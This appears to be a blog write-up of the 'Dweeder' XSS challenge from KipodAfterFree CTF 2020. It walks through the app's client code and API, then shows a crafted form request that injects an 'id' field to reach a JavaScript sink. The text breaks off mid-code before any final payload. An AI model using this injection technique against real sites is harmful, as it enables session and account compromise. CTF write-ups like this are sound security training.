@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Write Up : KipodAfterFree CTF 2020 - Dweeder &middot; 0xUKN - (in)Security Blog </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.68.3" />
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://0xukn.fr/css/nix.css">
+
+
+
+<link rel="shortcut icon" href="/favicon.jpg">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://0xukn.fr>0xUKN@localhost ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/">about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/posts">posts</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/projects">projects</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/tags">tags</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://0xukn.fr/posts/writeupkipodafterfreectf2020dweeder.exe/">Write Up : KipodAfterFree CTF 2020 - Dweeder</a></h1>
+	
+		<br><br>
+		<div id="tags">
+			<h4 style="display:inline">Tags :</h4>
+			
+				
+				<a href="/tags/web">web</a>
+			
+				 - 
+				<a href="/tags/xss">XSS</a>
+			
+		</div>
+	
+            <span class="post-date">2020-11-09 </span>
+            <div class="post-content">
+                <p><em><strong>This post spoils a CTF challenge &hellip; Don&rsquo;t read if you want to try it !</strong></em></p>
+<p>KipodAfterFree CTF is a Jeopardy-style information security competition hosted by KipodAfterFree CTF team. I registered late, so I only had time to do 2 challenges before the end of the CTF. Btw,the challenges were really interesting and will be left online until the end of November if you want to try them out.</p>
+<h2 id="-presentation"><em>[+]</em> Presentation</h2>
+<p>&ldquo;Dweeder is just like a large communication platform except that you can only use it with a plugged nose&rdquo; - @shuky, 2020</p>
+<p><a href="https://dweeder.ctf.kaf.sh/">https://dweeder.ctf.kaf.sh/</a></p>
+<h2 id="-recon"><em>[+]</em> Recon</h2>
+<p>We are facing a simple Twitter-like website with a login form. The login is composed with a public part (the handle) and a private one.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/kaf2020_dweeder/intro.png"  />
+    
+    
+</figure>
+</p>
+<p>Once logged in, there are 3 options.
+First, we can compose a dweed (with title and contents). Please note that it is possible to mention another user by using &ldquo;@USER_NAME&rdquo; in the content of the dweed.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/kaf2020_dweeder/compose.png"  />
+    
+    
+</figure>
+</p>
+<p>Then, you can list all dweeds mentionning you.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/kaf2020_dweeder/mentions.png"  />
+    
+    
+</figure>
+
+The admin (@shuky) states that he&rsquo;s monitoring the site and will open all messages in which he is mentionned. Looks like an XSS challenge.</p>
+<p>The third option is not useful for the challenge, but you can browse all the dweeds posted by other challengers.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/kaf2020_dweeder/feed.png"  />
+    
+    
+</figure>
+</p>
+<p>We can notice that this web application is mostly an API and a client-side framework which requests the API and shows us the results.
+It is also possible to open the dweeds by clicking them.</p>
+<p>The main web application loop is the following (I added some extra comments) :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#a6e22e">async</span> <span style="color:#66d9ef">function</span> () {
+    <span style="color:#75715e">// Load modules
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">Module</span>.<span style="color:#66d9ef">import</span>(<span style="color:#e6db74">&#34;UI&#34;</span>);
+    <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">Module</span>.<span style="color:#66d9ef">import</span>(<span style="color:#e6db74">&#34;API&#34;</span>);
+
+    <span style="color:#75715e">// Check whether login is needed
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>window.<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#34;token&#34;</span>)) {
+        <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">view</span>(<span style="color:#e6db74">&#34;setup&#34;</span>); <span style="color:#75715e">//If there is no token in localStorage, invite the user to register
+</span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">parameters</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parameters</span>.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#34;dweed&#34;</span>)) {
+            <span style="color:#a6e22e">loadDweed</span>(<span style="color:#a6e22e">parameters</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;dweed&#34;</span>)); <span style="color:#75715e">//load a specific dweed by its id (?dweed=DWEED_ID_HERE)
+</span><span style="color:#75715e"></span>        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#a6e22e">loadDweeds</span>(); <span style="color:#75715e">//load the feed
+</span><span style="color:#75715e"></span>        }
+    }
+});
+</code></pre></div><p>The &ldquo;mentions&rdquo;, &ldquo;feed&rdquo; and &ldquo;compose&rdquo; button are bound to Javascript functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">tiny</span> <span style="color:#a6e22e">center</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UI.view(&#39;compose&#39;);&#34;</span>&gt;Compose&lt;/<span style="color:#f92672">p</span>&gt;
+&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">tiny</span> <span style="color:#a6e22e">center</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UI.view(&#39;dweeds&#39;); loadDweeds()&#34;</span>&gt;Feed&lt;/<span style="color:#f92672">p</span>&gt;
+&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">tiny</span> <span style="color:#a6e22e">center</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UI.view(&#39;dweeds&#39;); loadMentions()&#34;</span>&gt;Mentions&lt;/<span style="color:#f92672">p</span>&gt;
+&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">tiny</span> <span style="color:#a6e22e">center</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;window.localStorage.clear(); window.location.reload();&#34;</span>&gt;Logout&lt;/<span style="color:#f92672">p</span>&gt;
+</code></pre></div><p>Here are the associated functions :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">insertDweed</span>(<span style="color:#a6e22e">dweed</span>) {
+    <span style="color:#75715e">// Find the template
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#34;dweed-&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">display</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">template</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>)
+        <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#34;dweed-normal&#34;</span>);
+    <span style="color:#75715e">// Make sure id is valid
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">28</span>)
+        <span style="color:#66d9ef">return</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">id</span>)
+        <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;0123456789 abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ !@#$%^&amp;*()_-+={}|&#34;</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">char</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>)
+            <span style="color:#66d9ef">return</span>;
+    <span style="color:#75715e">// Add the dweed
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#34;dweeds&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">populate</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">dweed</span>));
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">writeDweed</span>() {
+    <span style="color:#a6e22e">API</span>.<span style="color:#a6e22e">call</span>(<span style="color:#e6db74">&#34;dweeder&#34;</span>, <span style="color:#e6db74">&#34;writeDweed&#34;</span>, {
+        <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#34;token&#34;</span>),
+        <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">read</span>(<span style="color:#e6db74">&#34;write-title&#34;</span>),
+        <span style="color:#a6e22e">contents</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">read</span>(<span style="color:#e6db74">&#34;write-contents&#34;</span>)
+    }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">id</span>) =&gt; {
+        window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?dweed=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">id</span>;
+    }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">alert</span>);
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">readDweed</span>(<span style="color:#a6e22e">id</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+        <span style="color:#a6e22e">API</span>.<span style="color:#a6e22e">call</span>(<span style="color:#e6db74">&#34;dweeder&#34;</span>, <span style="color:#e6db74">&#34;readDweed&#34;</span>, {
+            <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#34;token&#34;</span>),
+            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">id</span>
+        }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">dweed</span>) =&gt; {
+            <span style="color:#75715e">// Ensure dweed structure
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">hasOwnProperty</span>(<span style="color:#e6db74">&#34;title&#34;</span>))
+                <span style="color:#a6e22e">reject</span>(<span style="color:#e6db74">&#34;Missing title property&#34;</span>);
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">hasOwnProperty</span>(<span style="color:#e6db74">&#34;contents&#34;</span>))
+                <span style="color:#a6e22e">reject</span>(<span style="color:#e6db74">&#34;Missing contents property&#34;</span>);
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">hasOwnProperty</span>(<span style="color:#e6db74">&#34;handle&#34;</span>))
+                <span style="color:#a6e22e">reject</span>(<span style="color:#e6db74">&#34;Missing handle property&#34;</span>);
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">hasOwnProperty</span>(<span style="color:#e6db74">&#34;time&#34;</span>))
+                <span style="color:#a6e22e">reject</span>(<span style="color:#e6db74">&#34;Missing date property&#34;</span>);
+            <span style="color:#75715e">// Resolve
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">dweed</span>);
+        }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">reject</span>);
+    });
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadDweed</span>(<span style="color:#a6e22e">id</span>) {
+    <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">clear</span>(<span style="color:#e6db74">&#34;dweeds&#34;</span>);
+    <span style="color:#a6e22e">readDweed</span>(<span style="color:#a6e22e">id</span>).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">dweed</span>) =&gt; {
+        <span style="color:#a6e22e">insertDweed</span>({
+            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">id</span>,
+            ...<span style="color:#a6e22e">dweed</span>,
+            <span style="color:#a6e22e">display</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;normal&#34;</span>
+        });
+    }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">alert</span>);
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadDweeds</span>() {
+    <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">clear</span>(<span style="color:#e6db74">&#34;dweeds&#34;</span>);
+    <span style="color:#a6e22e">API</span>.<span style="color:#a6e22e">call</span>(<span style="color:#e6db74">&#34;dweeder&#34;</span>, <span style="color:#e6db74">&#34;listDweed&#34;</span>, {
+        <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#34;token&#34;</span>)
+    }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">list</span>) =&gt; {
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">list</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>)) {
+            <span style="color:#a6e22e">readDweed</span>(<span style="color:#a6e22e">id</span>).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">dweed</span>) =&gt; {
+                <span style="color:#a6e22e">insertDweed</span>({
+                    ...<span style="color:#a6e22e">dweed</span>,
+                    <span style="color:#a6e22e">display</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;normal&#34;</span>,
+                    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">id</span>
+                });
+            }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">alert</span>);
+        }
+    }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">warn</span>);
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadMentions</span>() {
+    <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">clear</span>(<span style="color:#e6db74">&#34;dweeds&#34;</span>);
+    <span style="color:#a6e22e">API</span>.<span style="color:#a6e22e">call</span>(<span style="color:#e6db74">&#34;dweeder&#34;</span>, <span style="color:#e6db74">&#34;listMentions&#34;</span>, {
+        <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#34;token&#34;</span>)
+    }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">list</span>) =&gt; {
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">list</span>) {
+            <span style="color:#a6e22e">readDweed</span>(<span style="color:#a6e22e">id</span>).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">dweed</span>) =&gt; {
+                <span style="color:#75715e">// Insert dweed
+</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">insertDweed</span>({
+                    <span style="color:#a6e22e">display</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;normal&#34;</span>,
+                    ...<span style="color:#a6e22e">dweed</span>,
+                    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">id</span>
+                });
+            }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">alert</span>);
+        }
+    }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">warn</span>);
+}
+</code></pre></div><p>On the API side, dweeds are created with the following request to <code>apis/dweeder/?writeDweed</code>, which returns us the randomly generated id of the dweed :</p>
+<pre><code>------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;token&quot;
+
+YOUR_SECRET_TOKEN_FROM_LOCAL_STORAGE
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;contents&quot;
+
+@yologt Hi mate
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;title&quot;
+
+Hey !
+------WebKitFormBoundaryBMbsD8z0stKDVPNg--
+</code></pre><p>Also, dweeds can be read from the API with the following request to <code>apis/dweeder/?readDweed</code> :</p>
+<pre><code>------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;token&quot;
+
+eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6IjEiLCJoYW5kbGUiOiIxIn19:uxf/krfj1ERWO+Sydm0yQ3r8WdfhKOR9p2tM3nifqMg=
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;id&quot;
+
+DWEED_ID
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+</code></pre><p>It returns us the dweed as a JSON object :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+    <span style="color:#f92672">&#34;result&#34;</span>:
+        {
+            <span style="color:#f92672">&#34;contents&#34;</span>:<span style="color:#e6db74">&#34;@yologt Hi mate&#34;</span>, <span style="color:#960050;background-color:#1e0010">//controled</span> <span style="color:#960050;background-color:#1e0010">field</span>
+            <span style="color:#f92672">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;Hey !&#34;</span>, <span style="color:#960050;background-color:#1e0010">//controled</span> <span style="color:#960050;background-color:#1e0010">field</span>
+            <span style="color:#f92672">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;15:46&#34;</span>,
+            <span style="color:#f92672">&#34;handle&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>
+        },
+    <span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#66d9ef">true</span>
+}
+</code></pre></div><h2 id="-exploitation"><em>[+]</em> Exploitation</h2>
+<h3 id="1--finding-the-sink">1- Finding the sink</h3>
+<p>When you click a dweed from your mentions (as the admin does), you are basically redirected to <code>/?dweed=DWEED_ID</code>.</p>
+<p>The following <code>loadDweed</code> function is then called with this id:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadDweed</span>(<span style="color:#a6e22e">id</span>) {
+    <span style="color:#a6e22e">UI</span>.<span style="color:#a6e22e">clear</span>(<span style="color:#e6db74">&#34;dweeds&#34;</span>); <span style="color:#75715e">//clear the actual displayed dweeds
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">readDweed</span>(<span style="color:#a6e22e">id</span>).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">dweed</span>) =&gt; { <span style="color:#75715e">//readDweed requests the API to get the dweed
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">insertDweed</span>({ <span style="color:#75715e">//insertDweed populate a template with the object given as parameter
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">id</span>,
+            ...<span style="color:#a6e22e">dweed</span>,
+            <span style="color:#a6e22e">display</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;normal&#34;</span>
+        });
+    }).<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">alert</span>);
+}
+</code></pre></div><p>The dweed object structure is the following (from the API) :</p>
+<pre><code>{
+    &quot;contents&quot;:&quot;@yologt Hi mate&quot;, //controled field
+    &quot;title&quot;:&quot;Hey !&quot;, //controled field
+    &quot;time&quot;:&quot;15:46&quot;,
+    &quot;handle&quot;:&quot;1&quot;
+}
+</code></pre><p>So, as we control the contents and the title, we could try to inject an XSS payload in the content or the title in order to be reflected in the template. The problem is that a filter is in place in the [https://github.com/NadavTasher/Template/](templating framework) :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// Sanitize value using the default HTML sanitiser of the target browser
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sanitizer</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;p&#34;</span>);
+<span style="color:#a6e22e">sanitizer</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
+<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitizer</span>.<span style="color:#a6e22e">innerHTML</span>;
+</code></pre></div><p>This kind of approach of filtering is pretty strong against XSS in HTML context.</p>
+<p>Dweeds are rendered in the following template :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">template</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dweed-normal&#34;</span>&gt;
+    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;margin: 1vh;&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;window.location = &#39;?dweed=${id}&#39;&#34;</span> <span style="color:#a6e22e">button</span> <span style="color:#a6e22e">column</span>&gt;
+        &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">small</span> <span style="color:#a6e22e">left</span>&gt;@${handle}: ${title}&lt;/<span style="color:#f92672">p</span>&gt;
+        &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">tiny</span> <span style="color:#a6e22e">left</span>&gt;${contents}&lt;/<span style="color:#f92672">p</span>&gt;
+    &lt;/<span style="color:#f92672">div</span>&gt;
+&lt;/<span style="color:#f92672">template</span>&gt;
+</code></pre></div><p>Since <code>contents</code> and <code>title</code> are effectively used in an HTML context, we can&rsquo;t inject anything here. The last candidate is <code>id</code>. The problem is that we have no control over the <code>id</code> value since it is directly grabbed from the API and randomly generated by the server.</p>
+<h3 id="2--taking-over-the-id">2- Taking over the id</h3>
+<p>We can notice that if the dweed grabbed from the API has an <code>id</code> parameter, this <code>id</code> will overwrite the <code>id</code> used for rendering the dweed because of the 3 dots right here :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">        <span style="color:#a6e22e">insertDweed</span>({ <span style="color:#75715e">//insertDweed populate a template with the object given as parameter
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">id</span>,
+            ...<span style="color:#a6e22e">dweed</span>,
+            <span style="color:#a6e22e">display</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;normal&#34;</span>
+        });
+</code></pre></div><p>After a bit of research, I found that the server is accepting other parameters than the default ones <code>content</code> and <code>title</code> for creating a dweed. We can add field to the resulting dweed object by simply adding parameters at the dweed&rsquo;s creation. So we can insert an <code>id</code> field in the dweed and control the <code>id</code> value :</p>
+<pre><code>------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;token&quot;
+
+YOUR_SECRET_TOKEN_FROM_LOCAL_STORAGE
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;id&quot;
+
+yolo
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;contents&quot;
+
+@yologt Hi mate
+------WebKitFormBoundaryBMbsD8z0stKDVPNg
+Content-Disposition: form-data; name=&quot;title&quot;
+
+Hey !
+------WebKitFormBoundaryBMbsD8z0stKDVPNg--
+</code></pre><p>It returns us the dweed as a JSON object :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+    <span style="color:#f92672">&#34;result&#34;</span>:
+        {
+            <span style="color:#f92672">&#34;contents&#34;</span>:<span style="color:#e6db74">&#34;@yologt Hi mate&#34;</span>, <span style="color:#960050;background-color:#1e0010">//controled</span> <span style="color:#960050;background-color:#1e0010">field</span>
+            <span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;yolo&#34;</span>, <span style="color:#960050;background-color:#1e0010">//controled</span> <span style="color:#960050;background-color:#1e0010">field</span>
+            <span style="color:#f92672">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;Hey !&#34;</span>, <span style="color:#960050;background-color:#1e0010">//controled</span> <span style="color:#960050;background-color:#1e0010">field</span>
+            <span style="color:#f92672">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;15:46&#34;</span>,
+            <span style="color:#f92672">&#34;handle&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>
+        },
+    <span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#66d9ef">true</span>
+}
+</code></pre></div><p>At the first sight, we can think that it&rsquo;s an easy win : we have an injection in a Javascript context, our input is filtered for HTML context, so basically have XSS.
+Yes, but there is a second filter specially crafted for <code>id</code> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">28</span>)
+    <span style="color:#66d9ef">return</span>;
+<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">dweed</span>.<span style="color:#a6e22e">id</span>)
